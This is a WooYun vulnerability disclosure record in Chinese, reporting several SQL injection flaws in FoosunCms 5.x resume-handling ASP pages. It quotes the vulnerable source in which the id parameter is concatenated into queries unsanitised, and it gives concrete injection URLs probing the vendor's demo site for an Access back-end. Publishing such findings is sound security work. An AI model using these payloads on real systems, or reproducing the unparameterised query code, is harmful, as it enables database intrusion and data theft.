{"id": 50080, "wybug_id": "wooyun-2014-078961", "wybug_title": "FoosunCms 5.x最新版本多处sql注入", "wybug_corp": "FoosunCms", "wybug_author": "menmen519", "wybug_date": "2014-10-15 11:41", "wybug_open_date": "2015-01-13 11:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-15：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-01-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： FoosunCms 5.x最新版本多处sql注入 详细说明：  直接看代码：User/job/lib/AP_Resume_workcity.asp：(9-15):\n<%response.Charset=\"GB2312\"Dim resumeObj,id,Conn,actionMF_Default_Connid=trim(NoSqlHack(request.QueryString(\"id\")))action=trim(NoSqlHack(request.QueryString(\"action\")))Set resumeObj=New cls_resumeif id<>\"\" then call resumeObj.getResumeInfo(\"workcity\",id)%>\n这里面有一个getResumeInfo函数 ，我们跟进去看看cls_resume.asp:\nPublic function getResumeInfo(part,id)\t\tDim sqlstatement,resumeRs\t\tSet resumeRs=Server.CreateObject(G_FS_RS)\t\tselect case NoSqlHack(part)\t\t\tcase \"baseinfo\"    sqlstatement=\"select BID,UserNumber,Uname,Sex,PictureExt,Birthday,CertificateClass,CertificateNo,CurrentWage,CurrencyType,WorkAge,Province,City,HomeTel,CompanyTel,Mobile,Email,QQ,isPublic,click,lastTime,address,ShenGao,XueLi,HowDay from FS_AP_Resume_BaseInfo where bid=\"&CintStr(id)\t\t\tcase \"intention\"   sqlstatement=\"select BID,UserNumber,WorkType,Salary,SelfAppraise from FS_AP_Resume_Intention where bid=\"&id\t\t\tcase \"position\"    sqlstatement=\"select BID,UserNumber,trade,job from FS_AP_Resume_Position where bid=\"&id\t\t\tcase \"workcity\"    sqlstatement=\"select BID,UserNumber,Province,City from FS_AP_Resume_WorkCity where bid=\"&id\t\t\tcase \"workexp\"     sqlstatement=\"select BID,UserNumber,BeginDate,EndDate,CompanyName,CompanyKind,Trade,Job,Department,Description,Certifier,CertifierTel from FS_AP_Resume_WorkExp where bid=\"&CintStr(id)\t\t\tcase \"educateexp\"  sqlstatement=\"select BID,UserNumber,BeginDate,EndDate,SchoolName,Specialty,Diploma,Description from FS_AP_Resume_EducateExp where bid=\"&CintStr(id)\t\t\tcase \"trainexp\"    sqlstatement=\"select BID,UserNumber,BeginDate,EndDate,TrainOrgan,TrainAdress,TrainContent,Certificate from FS_AP_Resume_TrainExp where bid=\"&CintStr(id)\t\t\tcase \"language\"    sqlstatement=\"select BID,UserNumber,Language,Degree from FS_AP_Resume_Language where bid=\"&CintStr(id)\t\t\tcase \"certificate\" sqlstatement=\"select BID,UserNumber,FetchDate,Certificate,Score from FS_AP_Resume_Certificate where bid=\"&CintStr(id)\t\t\tcase \"projectexp\"  sqlstatement=\"select BID,UserNumber,BeginDate,EndDate,Project,SoftSettings,HardSettings,Tools,ProjectDescript,Duty from FS_AP_Resume_ProjectExp where bid=\"&CintStr(id)\t\t\tcase \"other\"       sqlstatement=\"select BID,UserNumber,Title,Content from FS_AP_Resume_Other where bid=\"&CintStr(id)\t\t\tcase \"mail\"        sqlstatement=\"select BID,UserNumber,MailName,Content from FS_AP_Resume_Mail where bid=\"&CintStr(id)\t\tEnd select\t\tresumeRs.open sqlstatement,Conn,1,3\t\tif resumeRs.eof then exit function\t\tif part=\"baseinfo\" then\t\t\t base_BID=resumeRs(\"BID\")\t\t\t base_UserNumber=resumeRs(\"UserNumber\")\t\t\t base_Uname=resumeRs(\"Uname\")\t\t\t base_Sex=resumeRs(\"Sex\")\t\t\t base_PictureExt=resumeRs(\"PictureExt\")\t\t\t base_Birthday=resumeRs(\"Birthday\")\t\t\t base_CertificateClass=resumeRs(\"CertificateClass\")\t\t\t base_CertificateNo=resumeRs(\"CertificateNo\")\t\t\t base_CurrentWage=resumeRs(\"CurrentWage\")\t\t\t base_CurrencyType=resumeRs(\"CurrencyType\")\t\t\t base_WorkAge=resumeRs(\"WorkAge\")\t\t\t base_Province=resumeRs(\"Province\")\t\t\t base_City=resumeRs(\"City\")\t\t\t base_HomeTel=resumeRs(\"HomeTel\")\t\t\t base_CompanyTel=resumeRs(\"CompanyTel\")\t\t\t base_Mobile=resumeRs(\"CompanyTel\")\t\t\t base_Email=resumeRs(\"Email\")\t\t\t base_QQ=resumeRs(\"QQ\")\t\t\t base_isPublic=resumeRs(\"isPublic\")\t\t\t base_click=resumeRs(\"click\")\t\t\t base_lastTime=resumeRs(\"lastTime\")\t\t\t \t\t\t base_address=resumeRs(\"address\")\t\t\t base_ShenGao=resumeRs(\"ShenGao\")\t\t\t base_XueLi=resumeRs(\"XueLi\")\t\t\t base_HowDay=resumeRs(\"HowDay\")\t\tElseif part=\"intention\" then\t\t\tItn_WorkType=resumeRs(\"WorkType\")\t\t\tItn_Salary=resumeRs(\"Salary\")\t\t\tItn_SelfAppraise=resumeRs(\"SelfAppraise\")\t\tElseif part=\"position\" then\t\t\tpos_trade=resumeRs(\"trade\")\t\t\tpos_job=resumeRs(\"job\")\t\tElseif part=\"workexp\" then\t\t\twep_BeginDate=resumeRs(\"BeginDate\")\t\t\twep_EndDate=resumeRs(\"EndDate\")\t\t\twep_CompanyName=resumeRs(\"CompanyName\")\t\t\twep_CompanyKind=resumeRs(\"CompanyKind\")\t\t\twep_Trade=resumeRs(\"Trade\")\t\t\twep_Job=resumeRs(\"job\")\t\t\twep_Department=resumeRs(\"Department\")\t\t\twep_workDescription=resumeRs(\"Description\")\t\t\twep_Certifier=resumeRs(\"Certifier\")\t\t\twep_CertifierTel=resumeRs(\"CertifierTel\")\t\tElseif part=\"educateexp\" then\t\t\tedu_BeginDate=resumeRs(\"BeginDate\")\t\t\tedu_EndDate=resumeRs(\"EndDate\")\t\t\tedu_SchoolName=resumeRs(\"SchoolName\")\t\t\tedu_Specialty=resumeRs(\"Specialty\")\t\t\tedu_Diploma=resumeRs(\"Diploma\")\t\t\tedu_Description=resumeRs(\"Description\")\t\tElseif part=\"trainexp\" then\t\t\ttrain_BeginDate=resumeRs(\"BeginDate\")\t\t\ttrain_EndDate=resumeRs(\"EndDate\")\t\t\ttrain_TrainOrgan=resumeRs(\"TrainOrgan\")\t\t\ttrain_TrainAdress=resumeRs(\"TrainAdress\")\t\t\ttrain_TrainContent=resumeRs(\"TrainContent\")\t\t\ttrain_Certificate=resumeRs(\"Certificate\")\t\tElseif part=\"language\" then\t\t\tlng_Language=resumeRs(\"Language\")\t\t\tlng_Degree=resumeRs(\"Degree\")\t\tElseif part=\"certificate\" then\t\t\tcer_FetchDate=resumeRs(\"FetchDate\")\t\t\tcer_Certificate=resumeRs(\"Certificate\")\t\t\tcer_Score=resumeRs(\"Score\")\t\tElseif part=\"projectexp\" Then\t\t\tPro_BeginDate=resumeRs(\"BeginDate\")\t\t\tPro_EndDate=resumeRs(\"EndDate\")\t\t\tPro_Project=resumeRs(\"Project\")\t\t\tPro_SoftSettings=resumeRs(\"SoftSettings\")\t\t\tPro_HardSettings=resumeRs(\"HardSettings\")\t\t\tPro_Tools=resumeRs(\"Tools\")\t\t\tPro_ProjectDescript=resumeRs(\"ProjectDescript\")\t\t\tPro_Duty=resumeRs(\"Duty\")\t\tElseif part=\"other\" Then\t\t\to_title=resumeRs(\"title\")\t\t\to_content=resumeRs(\"content\")\t\tElseif part=\"mail\" Then\t\t\tmailTitle=resumeRs(\"MailName\")\t\t\tmailContent=resumeRs(\"Content\")\t\tEnd if\tEnd function\n看到这里 ：case \"intention\"   sqlstatement=\"select BID,UserNumber,WorkType,Salary,SelfAppraise from FS_AP_Resume_Intention where bid=\"&id\t\t\tcase \"position\"    sqlstatement=\"select BID,UserNumber,trade,job from FS_AP_Resume_Position where bid=\"&id\t\t\tcase \"workcity\"    sqlstatement=\"select BID,UserNumber,Province,City from FS_AP_Resume_WorkCity where bid=\"&id这三个没有做任何处理我们直接访问：http://demo.foosun.net/foosun500/User/job/lib/AP_Resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from MSysAccessObjects) 正常访问，我们可以添加一个关键字，让它sql报错http://demo.foosun.net/foosun500/User/job/lib/AP_Resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from MSysAccessObjects1)\n\n这里我们已经证明了我们的猜想下来看第二处User\\Job\\lib\\AP_Resume_Position.asp：\n<%response.Charset=\"GB2312\"Dim resumeObj,id,Conn,actionMF_Default_Connid=trim(NoSqlHack(request.QueryString(\"id\")))action=trim(NoSqlHack(request.QueryString(\"action\")))Set resumeObj=New cls_resumeif id<>\"\" then call resumeObj.getResumeInfo(\"position\",id)%>\n 第三处：FoosunCMS\\User\\Job\\lib\\AP_Resume_Intention.asp：\nResponse.Charset=\"GB2312\"session(\"resumeStep\")=\"baseinfo\"Dim resumeObj,id,ConnMF_Default_Connid=trim(NoSqlHack(request.QueryString(\"id\")))Set resumeObj=New cls_resumeif id<>\"\" then call resumeObj.getResumeInfo(\"intention\",id)Conn.closeSet Conn=nothing%>\nok.................   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-10-15 11:49 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  多处    \n     2014-10-15 12:34 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  危害等级：无影响厂商忽略    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}